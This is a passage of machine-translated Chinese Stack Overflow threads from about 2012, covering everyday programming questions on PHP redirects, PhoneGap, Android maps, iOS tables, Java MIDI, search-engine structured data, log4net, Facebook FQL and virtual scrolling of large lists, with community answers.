if (strpos($headers[$index], 'Location: ') === 0) {
        $redirection = $headers[$index];
        break;
    }
header($redirection);
exit; 
```

试过以下

```
header($redirection);
echo "<HTML></HTML>";
exit; 
```

下面这个方法打破了它

```
if ($headers[$index]){
        $redirection = $headers[$index];
        break;
}
echo '<META HTTP-EQUIV="Refresh" Content="0; URL='.$redirection.'">';
exit; 
```

* * *

重定向是`https://www.youtube.com/watch?v=YVB1r4D8QH0?version=3`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-31T16:52:00.540

尝试在顶部添加一个输出缓冲区，在它之后不要回显任何其他内容然后退出

ob_start();

# javascript - PhoneGap - 无法写入 Android 文件

> ID：10989656
> 
> 赞同：5
> 
> 时间：2012-06-12T01:52:11.177
> 
> 标签：javascript, android, dom, cordova

我正在使用 PhoneGap 1.8 版 (cordova-1.8.0.js) 并尝试为 Android 制作应用程序。我正在通过 Eclipse 在实际设备上进行调试。

我正在尝试将文本写入文件。我正在使用 PhoneGap 提供的示例 API 代码

[http://docs.phonegap.com/en/1.8.0/cordova_file_file.md.html#FileWriter](http://docs.phonegap.com/en/1.8.0/cordova_file_file.md.html#FileWriter)

我已经能够使用我当前的设置创建应用程序，所以我知道它运行良好，我只是无法写入文件。我在这个问题上花了几个小时，但不断收到以下错误消息：

```
E/Web Console(27356): Uncaught ReferenceError: LocalFileSystem is not defined at file:///android_asset/www/debug.js:28 
```

第 28 行是

```
window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail); 
```

我正在使用 API 网站上的确切代码。

关于我可能做错的任何建议？

也许我没有在我的 PhoneGap 设置中导入正确的 Java 库？

我导入了以下内容：

```
import android.os.Bundle;
import org.apache.cordova.*;
import android.view.WindowManager;
import android.view.KeyEvent; 
```

谢谢你。

编辑：

我正在使用

```
$(document).ready(function () { 
```

而不是

```
 document.addEventListener("deviceready", onDeviceReady, false); 
```

因为它永远不会着火。这是我的确切代码，我也有

```
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

在我的 phonegap 项目中活跃。

完整代码：

```
<!DOCTYPE html>
<html>
<head>
<title>FileWriter Example</title>

<script type="text/javascript" charset="utf-8" src="cordova-1.8.0.js"></script>
<script type="text/javascript" charset="utf-8">

// Wait for Cordova to load
//
document.addEventListener("deviceready", onDeviceReady, false);

// Cordova is ready
//
function onDeviceReady() {

   alert("device ready"); // this never gets called

    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
}

function gotFS(fileSystem) {
    fileSystem.root.getFile("readme.txt", {create: true, exclusive: false}, gotFileEntry, fail);
}

function gotFileEntry(fileEntry) {
    fileEntry.createWriter(gotFileWriter, fail);
}

function gotFileWriter(writer) {
    writer.onwriteend = function(evt) {
        console.log("contents of file now 'some sample text'");
        writer.truncate(11);  
        writer.onwriteend = function(evt) {
            console.log("contents of file now 'some sample'");
            writer.seek(4);
            writer.write(" different text");
            writer.onwriteend = function(evt){
                console.log("contents of file now 'some different text'");
            }
        };
    };
    writer.write("some sample text");
}

function fail(error) {
    console.log(error.code);
}

</script>
</head>
<body>
<h1>Example</h1>
<p>Write File</p>
</body>
</html> 
```

我还在设备就绪调用中加入了一个警报功能，它根本不会被调用。

关于此代码如何不起作用的任何想法？

我可以让代码在启动时触发的唯一方法是使用

```
$(document).ready(function () { 

}); 
```

当我不断收到相同的错误消息时，我想这对尝试调用文件写入器并不好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:02:13.043

如果没有触发，问题不在于写入文件`deviceready`- 在于您的 phonegap 应用程序的设置方式。

您必须在主要活动中导入以下内容：

```
import android.app.Activity; // used to fire deviceready 
import android.os.Bundle;
import org.apache.cordova.*; 
```

# javascript - 这是有效的 js 参数吗？

> ID：10989658
> 
> 赞同：1
> 
> 时间：2012-06-12T01:52:35.733
> 
> 标签：javascript

我不确定我是否在编写有效的 javascript 参数。

```
function localData(){

    this.setInfo(key, value) =  
            function(){
                localStorage.setItem(key, value);
            };
} 
```

如何将 setInfo(key, value) 中的 key、value 参数发布到 function(){}？
有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:54:26.090

我说正确的是：

```
function localData(){
 setInfo = function(key, value) {
   localStorage.setItem(key, value);
 }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T01:58:39.070

我假设`localData`是您想要定义的函数`setInfo`，您可以使用两个参数调用它 -`key`和`value`. 试试这个：

```
this.setInfo = function (key, value) {
    // whatever code here
} 
```

请记住，函数也是对象！

# android - Android Map Overlay 不显示标记

> ID：10989659
> 
> 赞同：0
> 
> 时间：2012-06-12T01:52:56.177
> 
> 标签：android, google-maps-api-3, overlay

我的意图是创建一个充当指南的应用程序。我的第一步是获取地图，添加一些重要的名胜古迹并使用 LBS 和邻近警报，通知感兴趣的地点并叙述与该地点相关的内容。我的问题是，标记没有显示在地图上。我遵循了 Pro Android 3 书中给出的内容。代码如下。

 `````
package com.project1;

import java.util.List;

import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.util.Log;

import com.google.android.maps.GeoPoint;
import com.google.android.maps.MapActivity;
import com.google.android.maps.MapController;
import com.google.android.maps.MapView;
import com.google.android.maps.Overlay;
import com.google.android.maps.OverlayItem;

public class Testmap24Activity extends MapActivity {
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        Log.d("Check point 1","Check Point 1");
        MapView mv = (MapView)findViewById(R.id.mapview);
        mv.setBuiltInZoomControls(true);
        mv.displayZoomControls(true);
        MapController mvc = mv.getController();
        //mv.setSatellite(true);
        mv.setTraffic(true);
        mvc.setZoom(15);

       Drawable drawable = getResources().getDrawable(R.drawable.marker1);
       drawable.setBounds(drawable.getIntrinsicWidth()/2, drawable.getIntrinsicHeight(), drawable.getIntrinsicWidth()/2, 0 );

       map24overlay m24 = new map24overlay(drawable);
       mv.getOverlays().add(m24);
       GeoPoint pt = m24.getCenterPt();
       int latSpan = m24.getLatSpanE6();
       int lonSpan = m24.getLonSpanE6();
       Log.v("Overlays", "Lat span is " + latSpan);
       Log.v("Overlays", "Lon span is " + lonSpan);
       mv.animate();

           }

    @Override
    protected boolean isRouteDisplayed() {
        // TODO Auto-generated method stub
        return false;
    }
} 
````  `覆盖的代码如下。

 `````
package com.project1;

import java.util.ArrayList;
import java.util.Iterator;

import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.util.Log;

import com.google.android.maps.GeoPoint;
import com.google.android.maps.ItemizedOverlay;
import com.google.android.maps.MapView;
import com.google.android.maps.OverlayItem;

public class map24overlay extends ItemizedOverlay {
    private ArrayList<OverlayItem> locations = new ArrayList<OverlayItem>();
    private GeoPoint center = null;

    public map24overlay(Drawable drawable) {
        // TODO Auto-generated constructor stub
        super(drawable);            
        GeoPoint grtgr1 = new GeoPoint((int)13.044101 * 1000000, (int)80.232723 * 100000);
        GeoPoint grtpp = new GeoPoint((int)13.044101 * 1000000, (int)80.232723 * 100000);
        GeoPoint grtgr2 = new GeoPoint((int)13.044101 * 1000000, (int)80.232723 * 100000);
        GeoPoint grtpt = new GeoPoint((int)13.044101 * 1000000, (int)80.232723 * 100000);
        locations.add(new OverlayItem(grtgr1, "GRT Coats Road", "GRT Coats Road"));
        locations.add(new OverlayItem(grtpp, "Panagal Park", "Panagal Park"));
        locations.add(new OverlayItem(grtgr2, "GRT Usman Road", "GRT Usman Road"));
        locations.add(new OverlayItem(grtpt, "Pothys", "Pothys"));
        populate();
    }

    public GeoPoint getCenterPt() {
        if(center == null) {
        int northEdge = -90000000; // i.e., -90E6 microdegrees
        int southEdge = 90000000;
        int eastEdge = -180000000;
        int westEdge = 180000000;
        Iterator<OverlayItem> iter = locations.iterator();
        while(iter.hasNext()) {
        GeoPoint pt = iter.next().getPoint();
        if(pt.getLatitudeE6() > northEdge)
        northEdge = pt.getLatitudeE6();
        Log.d("North Edge", " " + northEdge + " ");
        if(pt.getLatitudeE6() < southEdge)
        southEdge = pt.getLatitudeE6();
        Log.d("South Edge", " " + southEdge + " ");
        if(pt.getLongitudeE6() > eastEdge)
        eastEdge = pt.getLongitudeE6();
        Log.d("East Edge", " " + eastEdge + " ");
        if(pt.getLongitudeE6() < westEdge)
        westEdge = pt.getLongitudeE6();
        Log.d("West Edge", " " + westEdge + " ");
        }
        center = new GeoPoint((int)((northEdge +southEdge)/2),
        (int)((westEdge + eastEdge)/2));
        }
        return center;
    }

    @Override
    public void draw(Canvas canvas, MapView mapView, boolean shadow)
    {
    // Hide the shadow by setting shadow to false
    super.draw(canvas, mapView, shadow);
    }

    @Override
    protected OverlayItem createItem(int arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public int size() {
        // TODO Auto-generated method stub
        return 0;
    }

} 
````  `上面的两个代码只显示没有标记的卫星视图地图。有人可以帮忙吗...？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-11T15:47:42.880

我在我的应用程序中做了类似的事情，它对我来说效果很好。

[你可以在这里看到样本](http://androidgeekworks.blogspot.com/2013/07/displaying-mulitiple-markers-on-map.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T05:00:37.010

为此，请使用以下链接的代码，它可能会对您有所帮助。

[地图叠加演示](http://eagle.phys.utk.edu/guidry/android/mapOverlayDemo.html)````

# ios - 在 UITableView 中显示固定数量的单元格：-滚动问题 iOS

> ID：10989660
> 
> 赞同：0
> 
> 时间：2012-06-12T01:53:12.737
> 
> 标签：ios

我从服务器获取单元格的数量，并且一次只想显示 5 个表格视图的单元格。

我有一个“更多”和“上一个”按钮，应该加载接下来的五个或前五个单元格。例如，如果单元格 10-15 可见，则按更多应显示单元格 16-20。

现在如果我有 62 行要显示，最后一次迭代应该只显示 2 个单元格，即 61 和 62，没有别的。

我可以使用以下方法滚动到特定单元格：
`(void)scrollToRowAtIndexPath:(NSIndexPath *)indexPath atScrollPosition:(UITableViewScrollPosition)scrollPosition animated:(BOOL)animated`

但是，这并没有显示顶部的下一个单元格。
例如，在位置 5，如果我按“更多”，单元格编号 6 将显示在底部，而最顶部则隐藏。相反，我希望它显示单元格 6-10 等等。

实现这种滚动方式的正确方法是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T05:16:10.520

有称为**[tableView beginUpdates]、[tableView endUpdates] 的 UITableView 属性，**所以你可以通过它们。它会解决你的问题

# java - 在使用 MIDI 乐器进行 MIDI 录音时合成声音

> ID：10989665
> 
> 赞同：0
> 
> 时间：2012-06-12T01:53:58.977
> 
> 标签：java, audio, record, midi, javasound

我正在制作一个 Java 应用程序来使用 midi 仪器录制 midi。我一直在使用带有 ASIO 驱动程序的 Java，使用 proyect [JAsioHost](http://www.kvraudio.com/forum/viewtopic.php?t=247084)来避免延迟。

目前我正在为每个音符产生纯正弦波。我想使用 java 提供的合成器产生声音，如下代码所示：

```
import javax.sound.midi.MidiChannel;
import javax.sound.midi.MidiSystem;
import javax.sound.midi.MidiUnavailableException;
import javax.sound.midi.Synthesizer;

public class Main {
    public static void main(String[] args) {
        Synthesizer synthesizer = null ; 
        MidiChannel [] channels = null ; 
        try {
            synthesizer = MidiSystem.getSynthesizer() ;
            synthesizer.open();
            channels = synthesizer.getChannels();
            channels[0].programChange(1) ;
            channels[0].noteOn( 70, 40) ;
            Thread.sleep( 3000) ;
        } catch (MidiUnavailableException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } 
        channels[ 0 ].noteOff(70) ;
    }
} 
```

为了实现这一点，我必须获得一个带有采样音频的浮点数组，该数组与调用 noteOn 函数时合成器生成的音频相对应（这样我就可以使用该数组通过驱动程序生成音频）。有谁知道如何做到这一点？

我正在考虑尝试查看 noteOn 函数实现，以查看在代码的某个点是否有一个包含采样音频的数组，然后再将其发送到混音器，但我不知道在哪里可以找到它。

ps：运行我的应用程序时，我无法调用该`synthesizer.open()`方法，因为在驱动程序运行时无法打开混音器。

# html - 搜索引擎如何从 html 页面中获取结构化数据？

> ID：10989671
> 
> 赞同：3
> 
> 时间：2012-06-12T01:54:56.503
> 
> 标签：html, search, seo, search-engine, semantic-web

系统如何确定哪个 html 元素包含有关哪个变量的数据？

HTML5 允许人们标记他们的元素，例如

```
<div data-productname=BMW>BMW</div> 
```

但是搜索引擎如何处理旧网站呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T04:32:11.740

这些`data-`属性供作者用于他们自己的目的，用于“私人使用”。浏览器、搜索引擎和其他软件应该会忽略它们，除非软件专门根据分配给它们的私人含义来使用它们。

所以任何使用它们的搜索引擎都被破坏了。

通常，搜索引擎不会尝试确定哪个 html 元素包含有关哪个变量的数据。它们作用于页面的文本内容，并在一定程度上作用于某些标记元素（如`h1`，可能被假定为比其他文本具有更高的相对相关性）。

已经并且正在为低级元数据开发系统，这些元数据可以使用例如具有特殊名称的类属性或一些新属性。一些主要的搜索引擎已经在某些方面表达了他们对这一点的支持，特别是参见[http://www.schema.org](http://www.schema.org)。但在实践中，他们似乎主要根据尚未公开披露的原则对非常大的网站这样做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-20T21:20:08.440

直到语义网发展起来（我不确定它会在何时以及以何种最终形式出现），从纯 HTML 中检索意义确实存在一些问题。如果（不一定是 HTML）页面的发布者不使用某种标准方式来说明哪些数据是什么，那么您（作为搜索引擎的一方）应该自己推断语义。首先，由于“非 HTML”页面的提及是新鲜的，因此存在托管 XML 页面以及 XSL 以在浏览器中呈现的站点。如果您知道所使用的模式或 DTD，XML 会为您提供更多语义信息。（顺便说一句，Wikipedia 确实为他们的 XML 文章提供档案。）如果 XML 没有被使用或没有记录，可以说，还有第二种方法，它需要专家和程序员。专家是分析内容并决定 HTML 页面的哪些部分应被视为存储特定信息的模板的人。例如，您可以为来自某些 Internet 目录的 html 页面的搜索结果精心制作模板，并为每个列出的站点提取类别、评级和其他内容。可以使用任意编程语言（C++、Python 等）从网页中解析和检测这些模板。在此之后，您可以申请一个知名的`map-reduce`算法或其他方法通过键值对索引提取的数据。如果您查看通常以这种模板化方式处理哪些站点，您会发现它们很大、公开且结构良好（随着时间的推移，结构几乎没有变化）。这对编写和重用模板很有意义。当然，如果相应的站点标记发生变化，同样的专家应该监控数据提取质量并编辑模板。意义的第三个资源是词汇。例如，如果你有一个全面的地理名称、商业公司（包括汽车制造商的子类别）和其他分类的东西，你几乎可以自动在语义索引中找到它们。我说“几乎”，因为您应该根据上下文词对每个命中进行加权 - 在有关计算机的文档中，`Java`最有可能是关于编程语言，而在旅行社的网站上，它更可能是一个岛屿。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-19T16:42:34.420

> 他们如何获得结构化信息？

他们将解析页面的 html 元素并将它们存储到与搜索引擎本身一样多样化的数据结构中。

一些搜索引擎将索引元信息，但主要的已经开始忽视元标记。

大多数搜索引擎考虑到：

*   纯文本信息
*   单词和短语的邻近信息
*   引用类似信息的链接
*   页面标题

这是一个有趣的信息图，可以回答您的任何其他问题：http: [//ppcblog.com/how-google-works/](http://ppcblog.com/how-google-works/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-21T12:22:56.220

在您的特定示例中，您应该考虑使用 RDFa 来描述 HTML 文档中的数据。你会注意到我没有提到使用微数据，那是因为 RDFa 可以为爬虫提供更丰富、更多方面的数据。在您的特定情况下，您可以利用 GoodRelations 词汇表（用于电子商务、产品和服务）、schema.org 词汇表（借用自 GoodRelations）和 Vehicle Sales Ontology（用于汽车）。请参阅下面的工作示例：

```
<div prefix="sc: http://schema.org/ gr: http://purl.org/goodrelations/v1# vso: http://purl.org/vso/ns#" 
     typeof="vso:Automobile gr:ProductOrServiceModel sc:Product" 
     resource="http://dbpedia.org/page/BMW_1_Series">
    <span property="gr:name sc:name">BMW 1 Series</span>
</div> 
```

这会在各个方面公开您的数据，使其几乎可以被任何搜索引擎（包括语义搜索引擎）理解和使用。此外，您还可以使用相同的 URI 来标识您的实例，从而链接到 DBPedia（维基百科数据库）中的资源。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-21T19:47:27.003

有几种方法可以提取此类信息：

*   [可以使用例如 RDF 或其他元数据描述语言（如schema.org](http://www.schema.org)中的那些语言）显式提供结构化信息。
*   谷歌可能与电子商务业务中的价格比较服务和/或大型个体参与者签订了合同，这允许他们从他们的数据库中检索结构化信息或使用特殊协议。
*   有一些流行的电子商务引擎，所以如果他们学会如何从特定引擎的 HTML 中提取数据，他们就可以处理大量使用该引擎的个体商店。
*   为了让蜘蛛识别看起来像产品描述的页面并自动提取一些结构化信息，可以应用启发式方法。很多元素都可以很容易识别，例如产品名称可能是页面顶部的一些文字放在H1标签中，如果有表格，它可能会寻找常见的属性名称，例如“价格”或“颜色”并尝试在表格附近的某个地方找到匹配的值（根据简单的模式识别价格相对容易，许多其他字段也是如此）。如您所知，Google 可以自动提取有关网页导航菜单的信息（无需页面本身的任何帮助），基于对带有导航菜单的典型页面的启发式分析。
*   现在谷歌最近开始使用完整的 Chrome 渲染引擎渲染网页，甚至运行 JavaScript，他们能够生成整个页面的 DOM 模型，这意味着他们也可以应用“视觉”启发式，比如“产品名称是页面顶部，以比周围环境更大的字体书写”等。我公司的一个产品执行类似的分析，所以我知道这很有可能（尽管计算成本很高）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-12T02:20:09.303

rdfa 和微格式等语义标记支持产品模式。

许多产品网站还希望您以某种格式提供包含产品数据的提要。

# javascript - 哪些免费的 javascript IDE 支持用户定义变量的自动完成和“跳转到定义”？

> ID：10989676
> 
> 赞同：0
> 
> 时间：2012-06-12T01:57:29.190
> 
> 标签：javascript, ide

我被 Visual Studio 宠坏了（但正在寻找替代品）。所以在下面的例子中，如果我输入 FirstCue。我想查看该变量的成员（FeedbackMild 等）。

另外，我希望能够跳转到*FirstCue*的定义。

到目前为止，我已经查看了 NetBeans（它没有执行第一个，没有进一步查看它是否执行了第二个）（。

```
function clsCues () {
    this.FeedbackMild=true ;  //boolean- whether we provide feedback to let them know if something is allowed or now (i.e., if they click on the wrong thing we'd do a Mild Feedback "ding"
    this.FeedbackCorrectIncorrect=true; //boolean -provide audio/visual feedback if their answer is correct
}

var FirstCue=new clsCues ();
    FirstCue.FeedbackMild=true; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T02:06:12.763

IMO 没有一个免费的 IDE 具有特别好的 JavaScript 支持。

[IntelliJ](http://www.jetbrains.com/idea/)有很好的[JavaScript](http://www.jetbrains.com/editors/javascript_editor.jsp?ide=idea)支持。但是，只有当您向他们索要操作系统许可证并且他们将其提供给您时，它才是免费的，这就是我仍在回答的原因。（此外，它拥有我用过的所有 IDE 中最好的 JS 支持。）

它还将突出显示非大写构造函数的可疑用法。

（社区版根据其功能比较矩阵不支持 JS 编辑。）

# dotcloud - 我在 dotcloud 中有一个自定义域，如何在自定义域上添加 ssl

> ID：10989677
> 
> 赞同：2
> 
> 时间：2012-06-12T01:57:41.080
> 
> 标签：dotcloud

dotcloud域与https一起使用，即

```
https://xxxx-username.dotcloud.com/ 
```

但我如何将其添加到自定义域？

```
https://mydomain.com 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T13:31:49.403

如果您想在自己的域名上使用 SSL，则需要购买自己的 SSL 证书，并升级到付费产品之一（专业版或企业版）。

为什么？因为他们需要将负载均衡器实例专用于您的应用程序（因为 SSL 需要每个域至少一个 IP 地址，或者更准确地说，每个证书需要一个 IP 地址）。

升级到其中一个付费计划后，您将提交一张支持票，让他们知道您想要自定义域的 SSL，他们会告诉您需要做什么才能启动和运行。

以下是这些步骤的简要概述。

如果您还没有，请为您的域购买 SSL 证书。

确保您已经为您想要 SSL 的应用程序添加了 DNS 别名。[http://docs.dotcloud.com/guides/domains/](http://docs.dotcloud.com/guides/domains/)

SSL 材料通常由两部分或三部分组成： - 密钥（应受密码保护）， - 证书（不必保护，因为它不包含敏感信息）， - 可选“证书链”或“中间证书”（这并不总是必要的；如果是，它可以与您的证书捆绑在一起，或者作为单独的文件提供；如果需要，您的证书颁发机构将提供）。

拥有这些文件后，您需要创建一个虚拟服务以安全的方式将它们传输到 dotCloud。该服务应命名为“edge.ssl”，类型为“python-worker”。它应该包含 2 或 3 个文件： - ssl.key（包含私钥） - ssl.crt（包含证书） - ssl.chain（可选；包含中间证书链）

推送此服务后，告诉他们，他们将继续设置您的 SSL 实例。

请注意，此“edge.ssl”不计入您部署的服务总数。这实际上只是一种方便且安全的方式来传输 SSL 材料，这些材料仅适用于他们的基础设施。

一旦他们拥有 SSL 证书，他们将部署您自己的专用负载均衡器，然后让您知道它何时可以使用，以及您需要如何明智地使用 DNS 才能开始使用它。

# logging - 为什么 log4net 使用对象？

> ID：10989680
> 
> 赞同：1
> 
> 时间：2012-06-12T01:58:20.377
> 
> 标签：logging, indexing, log4net

为什么log4net中ILog的签名使用对象作为参数？例如：

```
 void Info(object message); 
```

为什么不让它明确并期望一个字符串？幕后是否有一些复杂的反射功能，例如展平消息并将其转换为表格结构？或者这只是原始创作者的后见之明？

这是一个对象似乎表明前者，但我没有看到任何关于此的文档。

另外我打算将对象存储在数据库中，log4net 可以自动为我创建实体，以便轻松索引消息的内容吗？IE。如果我传入一个具有 3 个属性的对象，我想在单独的列中查看 3 个属性。与关系类似，我希望看到即时建立的关系。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T11:46:25.347

1.  我同意克里斯的观点，他们使用它是`object`为了让你可以通过任何东西。您只需要担心提供有用的`ToString()`实现。类似的事情在`string.Format()`.

2.  Log4net 不直接支持您的“数据库方案”，但应该可以在没有太多支出的情况下实现它。基本上，您需要编写自己的附加程序并使用该`MessageObject`属性从日志事件中检索原始 MessageObject。然后你可以以任何你想要的方式“轻松地”写入数据库。

# php - 如何调试此 FQL PHP 查询错误？

> ID：10989681
> 
> 赞同：0
> 
> 时间：2012-06-12T01:58:32.247
> 
> 标签：php, facebook, facebook-fql

我正在努力让[http://developers.facebook.com/docs/reference/fql/](http://developers.facebook.com/docs/reference/fql/)上的示例正常工作，但我遇到了一般错误（见下图）

![在此处输入图像描述](../Images/12eb2a1df682a72668dba3cea67da1ad.png)

这是我放在页面上的代码：

```
<?php
  $app_id = 'YOUR_APP_ID';
  $app_secret = 'YOUR_APP_SECRET';
  $my_url = 'POST_AUTH_URL';

  $code = $_REQUEST["code"];

  //auth user
  if(empty($code)) {
    $dialog_url = 'https://www.facebook.com/dialog/oauth?client_id=' 
    . $app_id . '&redirect_uri=' . urlencode($my_url) ;
    echo("<script>top.location.href='" . $dialog_url . "'</script>");
  }

  //get user access_token
  $token_url = 'https://graph.facebook.com/oauth/access_token?client_id='
    . $app_id . '&redirect_uri=' . urlencode($my_url) 
    . '&client_secret=' . $app_secret 
    . '&code=' . $code;
  $access_token = file_get_contents($token_url);

  // Run fql query
  $fql_query_url = 'https://graph.facebook.com/'
    . '/fql?q=SELECT+uid2+FROM+friend+WHERE+uid1=me()'
    . '&' . $access_token;
  $fql_query_result = file_get_contents($fql_query_url);
  $fql_query_obj = json_decode($fql_query_result, true);

  //display results of fql query
  echo '<pre>';
  print_r("query results:");
  print_r($fql_query_obj);
  echo '</pre>'; 
```

我怎么能开始调试呢？调试工具没有帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T04:58:55.353

您的错误根本与 FQL 无关并显示，因为 Facebook 无法加载您的应用程序。确保您已正确配置“画布 URL”和“安全画布 URL”。

# perl - LWP 设置了 max_size 但仍然获取内容

> ID：10989684
> 
> 赞同：1
> 
> 时间：2012-06-12T01:58:42.047
> 
> 标签：perl, www-mechanize, lwp, lwp-useragent, max-size

我正在使用 LWP 从某些站点获取内容，每当页面大小大于 1 兆字节时，我希望 LWP 停止下载页面。这是通过以下代码完成的：

```
my $ua = LWP::UserAgent->new;
$ua->max_size(1024); 
```

它工作正常。唯一的问题是，即使页面超过 1mb，我仍然希望能够获得到目前为止下载的内容。但是，每当我这样做时（在没有错误时使用 LWP 获取内容的传统方式）：

```
$ua->content; 
```

它似乎不是实际页面的内容，而是一堆废话。有谁知道设置 max_size 的方法，并且仍然可以在 LWP 甚至 WWW::Mechanize 达到限制之前下载任何内容？非常感谢！

# javascript - 有效地在 HTML 中显示大列表

> ID：10989686
> 
> 赞同：22
> 
> 时间：2012-06-12T01:59:02.237
> 
> 标签：javascript, html

是否有一个 JavaScript 库可以通过仅加载该列表的可查看部分并伪造滚动条来有效地加载一个巨大的列表？

```
<div id='container'>
  <!-- Empty but height is set to take up space to fake scrollbar -->
  <div id='hidden-before'></div>      

  <!-- Preloaded in case the user scrolls up -->
  <div id='preload-before'></div>

  <!-- User can see this. Height == #container's height -->
  <div id='viewable-section'></div>   

  <!-- Preloaded in case the user scrolls down -->
  <div id='preload-after'></div>

  <!-- Empty but height is set to take up space to fake scrollbar -->
  <div id='hidden-after'></div>       
</div> 
```

例如，Google Docs 对大文本文档执行此操作。

注意：我正在寻找的比无限滚动更复杂。无限滚动只是等你到底部，它会加载更多的数据，扩大滚动条。我正在寻找的内容会让您认为所有数据都已加载，因为滚动条是伪造的。当您到达底部时，您实际上已经到达了我要显示的列表的末尾。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2016-03-17T14:42:53.523

考虑[Clusterize.js](https://clusterize.js.org/)

这个插件完全符合你的要求。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-07-01T00:22:37.157

我遇到了类似的问题。场景是我已经有一个大的（约 400 多个元素）要显示在一个列表中，其中每个元素都可以有自己的视图。为这些元素创建、布局和绘制 DOM 的速度比我在尝试在滚动 DIV 中渲染整个列表时所需的速度要慢。

我看了几个解决方案。

**InfinityJS** [1] 非常接近我想要的，除了它要求包含列表项的元素已经添加到 DOM 中。

**Paul Irish 的无限滚动**[2] 也很有趣，但它正在解决一个与我需要解决的问题不同的特定问题。

**MegaList** [3] 最接近我想要的。Andrew（作者）在为移动设备设计它方面做得很好，支持触摸等。对我来说一个警告是它似乎假设了一个严格的选择列表模型并且比我想要的列表组件多一点做（例如绑定以调整事件大小并尝试自动处理）。

所以我开始编写一个以 iOS UITableView 为模型的准系统列表组件——称为 js-virtual-list-view (vlv :-)。这是一项正在进行的工作，除非你有类似的需求，但我不会推荐它。

来源在这里[https://github.com/shyam-habarakada/js-virtual-list-view](https://github.com/shyam-habarakada/js-virtual-list-view)。

需要贡献者:-)

[1] [http://airbnb.github.io/infinity/](http://airbnb.github.io/infinity/)

[2] [http://www.infinite-scroll.com/](http://www.infinite-scroll.com/)

[3] [https://github.com/triceam/MegaList](https://github.com/triceam/MegaList)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-12T02:05:35.623

这是一种称为“无限滚动”的技术，多个库都支持它。如果您使用的是 jQuery，请查看：

[http://www.infinite-scroll.com/](http://www.infinite-scroll.com/)

如您所知，这个想法是确定用户当前可以看到的数据集的“多少”，然后*只*执行该数据集的请求，但将滚动设置为与整个集合的大小相关。这样，一旦用户滚动到某个点，您就可以请求数据集的下一部分。

ExtJS 也将此作为其基于组件的框架的一部分。这是[一个网格示例](http://dev.sencha.com/deploy/ext-4.0.0/examples/grid/infinite-scroll.html)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-06-12T02:06:11.130

你试过css中的overflow属性吗？只需给您的容器 div 一个标准的宽度和高度，如下所示：

#container { 高度：500px; 宽度：500px；溢出：自动；}

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-07T15:24:04.573

这篇文章涵盖了您的问题并提供了答案 - [http://engineering.linkedin.com/linkedin-ipad-5-techniques-smooth-infinite-scrolling-html5](http://engineering.linkedin.com/linkedin-ipad-5-techniques-smooth-infinite-scrolling-html5)

不是您所追求的杀手级插件，而是在很大程度上解释了您将如何自己创建它。

更新：有一个名为 infinity.js 的新库，更多信息在这里 - [https://stackoverflow.com/a/12108015/921259](https://stackoverflow.com/a/12108015/921259)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-08-27T11:15:02.027

您可以考虑使用 Polymer `<iron-list>`，它实际上会消耗所有数据，但它只将少数节点附加到 DOM 并处理数据绑定以在用户滚动时显示正确的内容。

我以前使用过它，并通过无缝滚动的 2000 多个项目（这些项目也是复杂的自定义元素）的自定义列表获得了非常好的结果。

虽然我自己没有尝试过，但 Polymer 团队声称它可以很容易地与其他框架混合使用。

[https://www.webcomponents.org/element/PolymerElements/iron-list](https://www.webcomponents.org/element/PolymerElements/iron-list)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-01-22T13:33:50.457

滚动大型列表时确实会降低性能。即使您对视口上不可见的每个元素设置`display:none;`或设置`visibility:hidden;`，您也会有一些滞后，因为当您滚动列表时每个元素仍在重新计算。

为了避免重新计算，每个元素都应该移动到虚拟 DOM，这样它就永远不会被渲染，并且某些属性（如高度/宽度）将默认为`0`.

有一些库可以处理虚拟滚动，如[Clusterize](https://clusterize.js.org/)、[ngx-ui-scroll](https://dhilt.github.io/ngx-ui-scroll/)、[hyperlist](https://github.com/tbranyen/hyperlist)等。

但是其中一些不支持动态行高，其中一些没有 MIT 许可，并且其中一些具有用于操作内容列表的小功能。所以我决定构建一个可以像[这个例子](https://playcode.io/224164?tabs=model.js&output)一样处理动态行高的[MVW 库](https://github.com/ScarletsFiction/ScarletsFrame)。是的，它可以用于自动滚动到选定的索引。`scrollTo(index)`

实现就像

```
<div sf-controller="large-list">
  <ul class="sf-virtual-scroll">

    <li sf-repeat-this="x in list">
      {{x.id}}
    </li>

  </ul>
</div> 
```

```
sf.model.for('large-list', function(self){
  self.list = [];

  for(var i = 0; i < 1000; i++){
